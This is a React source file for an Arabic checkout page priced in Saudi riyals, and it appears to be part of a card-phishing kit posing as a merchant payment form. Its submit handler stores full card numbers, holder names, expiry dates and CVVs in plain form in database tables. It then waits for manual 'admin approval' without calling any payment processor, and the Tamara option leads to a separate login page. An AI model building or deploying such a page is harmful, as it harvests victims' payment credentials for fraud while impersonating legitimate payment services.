import { useState, useMemo, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowRight, Lock, CreditCard, Loader2, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { toast as sonnerToast } from "sonner";
import tamaraLogo from "@/assets/tamara-logo.png";
import tabbyLogo from "@/assets/tabby-logo.png";

const Payment = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const {
    orderData,
    updateOrderData
  } = useOrder();
  const {
    toast
  } = useToast();

  useEffect(() => {
    // صوت تنبيه فقط (بدون إشعار للعميل)
    const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIGGS76OakUhELTKXh8LRkHAdDlNav8rRfGwU7lNP0w3QlBSl+zPDajUIKC1Sv5O+qVBEJSqHh8LhlHQU0h9Xy0H4qBSdzu+nqpE8QCUye3vK7YB0FPI/T9MN0JgUofszw2o1CCgtUr+Tvq1QQCUqh4fC4ZR0FNIfV8tB+KgUocrvo6aVPEApNnt/yumAdBTyP0/PCdCUFKH3M8NuNQgkLVK/k76tVEAlKoODwuGUdBTOH1fLQfioFKHO76OqkTxAKTZ3e8rpgHgU7j9P0w3QmBSl9zPDbj0IJC1Su5O+rVBAJSqDg8LhlHQU0h9Xy0H4qBSdzu+jqpFAQCkyd3vK6YB0FPI/T9MN0JgUofczw2o1CCQtUruTvq1USCD+P0/TDdCcFKXzM8NqPQgkJUq7k76pVEQlJoN/wuGYdBTiH1fLPfisGKHK76OqlUBAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIJC1Ss5O+qVREKSqDf8LhlHAU2h9Xy0H4rBShzu+jqpVAQCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCQtUruTvqlURCkqg3/C4ZhwFNofV8tB+KwUocrvo6qVQEAhMnN7yumAdBTyP0/TDdCcFKH3M8NqNQgkLVK7k76pVEQpKoODwuGYcBTaH1fLQfiwFKHO76OqkUBAITJvf8rpfHQU8j9P0w3QmBSh9zPDajUIJC1Su5O+qVREKSp/g8LhmHAU2h9Xy0H4sBShyu+jqpE8QCEyb3/K6YB0FPI/T9MN0JgUofczw2o1CCQtUruTvqlUQCkqg4PC4ZR0FNofV8tB+KgUocrvo6qRQEAhMnN7yumAdBTyP0/TDdCYFKH3M8NqNQgkLVK7k76pVEQpKoODwuGUdBTaH1fLQfisFKHO76OqkUBAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIJC1Su5O+qVREKSqDg8LhlHQU2h9Xy0H4qBShzu+jqpU8QCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCQtUruTvq1URCkqg4PC4ZR0FNofV8tB+KgUocrvo6qRPEAhMnN7yumAdBTyP0fTDdCcFKH3M8NqNQgkLVK7k76pVEQpKoODwuGUdBTaH1fLQfioFKHO76OqkTxAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIJC1Su5O+qVRIKSqDg8LhlHQU2h9Xy0H4qBShzu+jqpE8QCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCgtUruTvq1QRCkqg4PC4ZhwFNofV8tB+LAUoc7vo6qRPEAhMnN7yumAdBTyP0/TDdCYFKH3M8NqNQgoLVK7k76pVEgpKoODwuGYcBTaH1fLQfiwFKHO76OqkTxAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIKC1Ss5O+rVRIKSqDg8LhlHQU3h9Xy0H4sBShzu+jqpE8QCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCgtUruTvq1USCkqg4PC4ZhwFNofV8tB+LAUoc7vo6qRPEAhMnN7yumAdBTyP0/TDdCYFKH3M8NqNQgoLVK7k76tVEgpKoODwuGYcBTaH1fLQfiwFKHO76OqkTxAITJze8rphHQU8kNP0w3QmBSh9zPDajUIKC1Su5O+rVRIKSqDg8LhmHAU2h9Xy0H4sBShzu+jqpE8QCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCgtUruTvq1URCkqg4PC4ZhwFN4fV8tB+LAUoc7vo6qRPEAhMnN7yumAdBTyP0/TDdCYFKH3M8NqNQgoLVK7k76tVEgpKoODwuGYcBTaH1fLQfiwFKHO76OqkUBAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIKC1Su5O+rVRIKSqDg8LhmHAU2h9Xy0H4sBShzu+jqpFAQCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCgtUruTvq1USCkqg4PC4ZhwFNofV8tB+LAUoc7vo6qRQEAhMnN7yumAdBTyQ0/TDdCYFKH3M8NqNQgoLVK7k76tVEgpKoODwuGYcBTaH1fLQfiwFKHO76OqkUBAITJze8rpgHQU8j9P0w3QmBSh9zPDajUIKC1Su5O+rVRIKSqDg8LhmHAU2h9Xy0H4sBShzu+jqpFAQCEyc3vK6YB0FPI/T9MN0JgUofczw2o1CCgtUruTvq1USCkqg4PC4ZhwFNofV8tB+LAUoc7vo6qRQEAhMnN7yumAdBTyP0/TDdCYFKH3M8NqNQgoLVK7k76tVEgpKoODwuGYcBTaH1fLQfiwFKHO76OqkUBAITJze8rphHQU8kNP0w3QmBSh9zPDajUIKC1Su5O+rVRIKSqDg8LhmHAU');
    audio.play().catch(e => console.log("Audio play failed:", e));
  }, []);
  const companyName = searchParams.get("company") || "";
  const price = parseFloat(searchParams.get("price") || "0");
  const regularPrice = parseFloat(searchParams.get("regularPrice") || "0");
  const discount = Math.round((regularPrice - price) / regularPrice * 100);
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [rejectionError, setRejectionError] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<"card" | "tamara" | "tabby">("card");

  // Listen to status changes in real-time
  useEffect(() => {
    if (!orderData.sequenceNumber) {
      console.log("No sequence number, skipping realtime subscription");
      return;
    }

    console.log("Setting up realtime subscription for order:", orderData.sequenceNumber);
    
    const channel = supabase
      .channel(`order-${orderData.sequenceNumber}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'customer_orders',
          filter: `sequence_number=eq.${orderData.sequenceNumber}`
        },
        (payload: any) => {
          console.log("Received realtime update:", payload);
          const newStatus = payload.new.status;
          console.log("New status:", newStatus);
          
          if (newStatus === 'approved') {
            console.log("Status is approved, navigating to processing payment");
            setWaitingApproval(false);
            const last4 = cardNumber.slice(-4);
            navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${last4}`);
          } else if (newStatus === 'rejected') {
            console.log("Status is rejected");
            setWaitingApproval(false);
            setRejectionError(true);
            toast({
              title: "تم رفض معلومات الدفع",
              description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
              variant: "destructive",
            });
          }
        }
      )
      .subscribe((status) => {
        console.log("Subscription status:", status);
      });

    return () => {
      console.log("Cleaning up realtime subscription");
      supabase.removeChannel(channel);
    };
  }, [orderData.sequenceNumber, cardNumber, companyName, price, navigate, toast]);

  // Detect card type
  const cardType = useMemo(() => {
    const cleaned = cardNumber.replace(/\s/g, "");
    if (/^4/.test(cleaned)) return "visa";
    if (/^5[1-5]/.test(cleaned)) return "mastercard";
    if (/^2[2-7]/.test(cleaned)) return "mastercard";
    return null;
  }, [cardNumber]);
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "");
    if (value.length <= 16 && /^\d*$/.test(value)) {
      setCardNumber(value);
    }
  };
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setCvv(value);
    }
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejectionError(false);

    const expiryDate = `${expiryMonth}/${expiryYear}`;

    // Update context
    updateOrderData({
      cardNumber: cardNumber,
      cardHolderName: cardHolder,
      expiryDate: expiryDate,
      cvv: cvv
    });

    // Update database and set status to waiting_approval
    try {
      if (orderData.sequenceNumber) {
        // First, get the order ID
        const { data: orderInfo, error: orderError } = await supabase
          .from("customer_orders")
          .select("id")
          .eq("sequence_number", orderData.sequenceNumber)
          .single();

        if (orderError) throw orderError;

        // Update the order
        const { error } = await supabase.from("customer_orders").update({
          card_number: cardNumber,
          card_holder_name: cardHolder,
          expiry_date: expiryDate,
          cvv: cvv,
          status: 'waiting_approval'
        }).eq("sequence_number", orderData.sequenceNumber);

        if (error) throw error;

        // Save payment attempt
        const { error: paymentError } = await supabase
          .from("payment_attempts")
          .insert({
            order_id: orderInfo.id,
            card_number: cardNumber,
            card_holder_name: cardHolder,
            expiry_date: expiryDate,
            cvv: cvv,
          });

        if (paymentError) {
          console.error("Error saving payment attempt:", paymentError);
        }

        // Start waiting for admin approval
        setWaitingApproval(true);
      }
    } catch (error) {
      console.error("Error updating order:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إرسال البيانات",
        variant: "destructive",
      });
    }
  };
  return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
      {/* Header */}
      <div className="bg-gradient-to-b from-primary to-primary-dark py-8">
        <div className="container mx-auto px-4">
          <Button variant="ghost" onClick={() => navigate(-1)} className="text-white hover:bg-white/10 mb-4">
            <ArrowRight className="ml-2" />
            العودة
          </Button>
          <h1 className="text-2xl font-bold text-white text-center">
            أدخل معلومات البطاقة لإتمام الطلب
          </h1>
        </div>
      </div>

      <div className="container mx-auto px-4 py-12">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {/* Payment Form */}
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <h2 className="text-2xl font-bold text-foreground mb-6">اختر وسيلة الدفع</h2>
            
            {/* Payment Method Selection */}
            <div className="space-y-4 mb-8">
              {/* Card Payment */}
              <div 
                onClick={() => setPaymentMethod("card")}
                className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                  paymentMethod === "card" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:border-primary/50"
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === "card" ? "border-primary" : "border-border"
                    }`}>
                      {paymentMethod === "card" && (
                        <div className="w-3 h-3 rounded-full bg-primary"></div>
                      )}
                    </div>
                    <span className="font-semibold">بطاقة ائتمانية</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="h-8 w-12 flex items-center justify-center bg-white rounded border border-gray-200 px-1">
                      <svg viewBox="0 0 48 32" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
                        <rect width="48" height="32" rx="4" fill="white"/>
                        <path d="M12 10h24v2H12v-2zm0 5h24v2H12v-2z" fill="#1434CB"/>
                      </svg>
                    </div>
                    <div className="h-8 w-10 flex items-center justify-center bg-white rounded border border-gray-200 p-1">
                      <svg viewBox="0 0 48 32" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
                        <circle cx="18" cy="16" r="10" fill="#EB001B"/>
                        <circle cx="30" cy="16" r="10" fill="#F79E1B"/>
                        <path d="M24 8a9.98 9.98 0 0 0-6 8 9.98 9.98 0 0 0 6 8 9.98 9.98 0 0 0 6-8 9.98 9.98 0 0 0-6-8z" fill="#FF5F00"/>
                      </svg>
                    </div>
                    <div className="h-8 w-14 flex items-center justify-center bg-white rounded border border-gray-200 p-1">
                      <div className="w-full h-full flex items-center justify-center text-xs font-bold text-blue-900">مدى</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Tamara */}
              <div 
                onClick={() => setPaymentMethod("tamara")}
                className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                  paymentMethod === "tamara" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:border-primary/50"
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === "tamara" ? "border-primary" : "border-border"
                    }`}>
                      {paymentMethod === "tamara" && (
                        <div className="w-3 h-3 rounded-full bg-primary"></div>
                      )}
                    </div>
                    <div>
                      <div className="font-semibold">تمارا</div>
                      <div className="text-xs text-muted-foreground">قسم مشترياتك على 4 دفعات</div>
                    </div>
                  </div>
                  <div className="h-8 w-20 flex items-center justify-center bg-white rounded border border-gray-200 p-1">
                    <img src={tamaraLogo} alt="تمارا" className="w-full h-full object-contain" />
                  </div>
                </div>
                {paymentMethod === "tamara" && (
                  <div className="mt-4 p-3 bg-blue-50 rounded-lg">
                    <div className="text-sm font-semibold mb-2">خطة التقسيط:</div>
                    <div className="grid grid-cols-4 gap-2 text-xs">
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">اليوم</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد شهر</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد شهرين</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد 3 أشهر</div>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Tabby */}
              <div 
                onClick={() => setPaymentMethod("tabby")}
                className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                  paymentMethod === "tabby" 
                    ? "border-primary bg-primary/5" 
                    : "border-border hover:border-primary/50"
                }`}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === "tabby" ? "border-primary" : "border-border"
                    }`}>
                      {paymentMethod === "tabby" && (
                        <div className="w-3 h-3 rounded-full bg-primary"></div>
                      )}
                    </div>
                    <div>
                      <div className="font-semibold">تابي</div>
                      <div className="text-xs text-muted-foreground">قسم مشترياتك على 4 دفعات</div>
                    </div>
                  </div>
                  <div className="h-8 w-20 flex items-center justify-center bg-white rounded border border-gray-200 p-1">
                    <img src={tabbyLogo} alt="تابي" className="w-full h-full object-contain" />
                  </div>
                </div>
                {paymentMethod === "tabby" && (
                  <div className="mt-4 p-3 bg-blue-50 rounded-lg">
                    <div className="text-sm font-semibold mb-2">خطة التقسيط:</div>
                    <div className="grid grid-cols-4 gap-2 text-xs">
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">اليوم</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد شهر</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد شهرين</div>
                      </div>
                      <div className="text-center">
                        <div className="font-bold">{(price / 4).toFixed(2)} ر.س</div>
                        <div className="text-muted-foreground">بعد 3 أشهر</div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {paymentMethod === "card" && (
              <>
                <h3 className="text-xl font-bold text-foreground mb-6">معلومات البطاقة</h3>
            
            {rejectionError && (
              <Alert variant="destructive" className="mb-6">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  تم رفض معلومات الدفع. يرجى التأكد من صحة البيانات وإعادة الإدخال.
                </AlertDescription>
              </Alert>
            )}

            {waitingApproval && (
              <Alert className="mb-6 bg-blue-50 border-blue-200">
                <Loader2 className="h-4 w-4 animate-spin" />
                <AlertDescription className="text-blue-900">
                  تم إرسال معلومات الدفع بنجاح. في انتظار موافقة الإدارة...
                </AlertDescription>
              </Alert>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="cardHolder">
                  اسم حامل البطاقة <span className="text-destructive">*</span>
                </Label>
                <Input id="cardHolder" placeholder="الاسم كما هو مكتوب على البطاقة" value={cardHolder} onChange={e => setCardHolder(e.target.value)} required className="text-right" />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardNumber">
                  رقم البطاقة <span className="text-destructive">*</span>
                </Label>
                <div className="relative">
                  <Input id="cardNumber" placeholder="1234 5678 9012 3456" value={formatCardNumber(cardNumber)} onChange={handleCardNumberChange} required className="text-right pr-12" dir="ltr" />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    {cardType === "visa" && <div className="flex items-center gap-1">
                        <div className="text-xs font-bold text-blue-600 bg-blue-50 px-2 py-1 rounded">VISA</div>
                      </div>}
                    {cardType === "mastercard" && <div className="flex items-center gap-1">
                        <div className="flex">
                          <div className="w-4 h-4 rounded-full bg-red-500"></div>
                          <div className="w-4 h-4 rounded-full bg-orange-400 -ml-2"></div>
                        </div>
                        <div className="text-xs font-bold text-orange-600">Mastercard</div>
                      </div>}
                    {!cardType && cardNumber.length > 0 && <CreditCard className="h-5 w-5 text-muted-foreground" />}
                    {!cardNumber && <CreditCard className="h-5 w-5 text-muted-foreground" />}
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label>
                    تاريخ الانتهاء <span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-2">
                    <Input placeholder="YY" value={expiryYear} onChange={e => {
                    const val = e.target.value;
                    if (val.length <= 2 && /^\d*$/.test(val)) setExpiryYear(val);
                  }} required className="text-center" maxLength={2} />
                    <span className="flex items-center text-muted-foreground">/</span>
                    <Input placeholder="MM" value={expiryMonth} onChange={e => {
                    const val = e.target.value;
                    if (val.length <= 2 && /^\d*$/.test(val) && parseInt(val || "0") <= 12) {
                      setExpiryMonth(val);
                    }
                  }} required className="text-center" maxLength={2} />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cvv">
                    رمز الأمان (CVV) <span className="text-destructive">*</span>
                    <span className="text-xs text-muted-foreground mr-1">(خلف البطاقة)</span>
                  </Label>
                  <Input id="cvv" placeholder="123" value={cvv} onChange={handleCvvChange} required className="text-center" maxLength={3} />
                </div>
              </div>

              <Button 
                type="submit" 
                disabled={waitingApproval}
                className="w-full h-14 text-lg bg-accent hover:bg-accent/90"
              >
                {waitingApproval ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    في انتظار الموافقة...
                  </>
                ) : (
                  <>
                    <Lock className="ml-2 h-5 w-5" />
                    إرسال معلومات الدفع
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
              </p>
            </form>
            </>
            )}

            {(paymentMethod === "tamara" || paymentMethod === "tabby") && (
              <div className="text-center space-y-4">
                <Button 
                  onClick={() => {
                    if (paymentMethod === "tamara") {
                      navigate(`/tamara-login?company=${encodeURIComponent(companyName)}&price=${price}`);
                    } else {
                      toast({
                        title: "سيتم تحويلك إلى تابي",
                        description: "جاري التحويل إلى بوابة الدفع...",
                      });
                    }
                  }}
                  className="w-full h-14 text-lg bg-accent hover:bg-accent/90"
                >
                  <Lock className="ml-2 h-5 w-5" />
                  إتمام الدفع عبر {paymentMethod === "tamara" ? "تمارا" : "تابي"}
                </Button>
                <p className="text-xs text-muted-foreground">
                  بإتمام الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                </p>
              </div>
            )}
          </div>

          {/* Order Summary & Card Preview */}
          <div className="space-y-6">
            {/* Card Preview */}
            <div className="relative perspective-1000">
              <div className="bg-gradient-to-br from-primary via-primary-dark to-accent rounded-2xl p-6 md:p-8 text-white shadow-2xl relative overflow-hidden">
                
                {/* Card content */}
                <div className="relative z-10 flex flex-col justify-between h-full min-h-[200px]">
                  <div className="flex justify-between items-start mb-8">
                    <div className="w-12 h-10 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md shadow-lg"></div>
                    {cardType === "visa" && (
                      <div className="text-2xl font-bold bg-white text-primary px-3 py-1 rounded">VISA</div>
                    )}
                    {cardType === "mastercard" && (
                      <div className="flex items-center gap-1">
                        <div className="w-8 h-8 rounded-full bg-red-500"></div>
                        <div className="w-8 h-8 rounded-full bg-orange-400 -ml-4"></div>
                      </div>
                    )}
                  </div>

                  <div className="space-y-4">
                    <div className="text-xl md:text-2xl tracking-[0.25em] font-mono font-light">
                      {cardNumber ? formatCardNumber(cardNumber).padEnd(19, "•") : "•••• •••• •••• ••••"}
                    </div>
                    
                    <div className="flex justify-between items-end">
                      <div className="flex-1">
                        <div className="text-xs text-white/70 mb-1">حامل البطاقة</div>
                        <div className="font-medium text-sm md:text-base uppercase">
                          {cardHolder || "CARDHOLDER NAME"}
                        </div>
                      </div>
                      <div>
                        <div className="text-xs text-white/70 mb-1 text-right">تاريخ الانتهاء</div>
                        <div className="font-mono text-sm md:text-base">
                          {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Order Summary */}
            <div className="bg-white rounded-2xl shadow-lg p-6">
              <h3 className="text-xl font-bold text-foreground mb-4">ملخص الطلب</h3>
              
              <div className="space-y-4">
                <div className="flex justify-between items-start pb-4 border-b border-border">
                  <div className="flex-1">
                    <div className="text-sm text-muted-foreground mb-1">الشركة:</div>
                    <div className="font-medium text-foreground">{companyName}</div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">السعر الأصلي:</span>
                    <span className="line-through text-muted-foreground">{regularPrice.toFixed(2)} ﷼</span>
                  </div>
                  
                  <div className="flex justify-between text-sm">
                    <span className="text-accent font-medium">الخصم {discount}%:</span>
                    <span className="text-accent font-medium">- {(regularPrice - price).toFixed(2)} ﷼</span>
                  </div>
                </div>

                <div className="pt-4 border-t border-border">
                  <div className="flex justify-between items-center">
                    <span className="text-lg font-bold">المبلغ الإجمالي:</span>
                    <span className="text-2xl font-bold text-primary">{price.toFixed(2)} ﷼</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>;
};
export default Payment;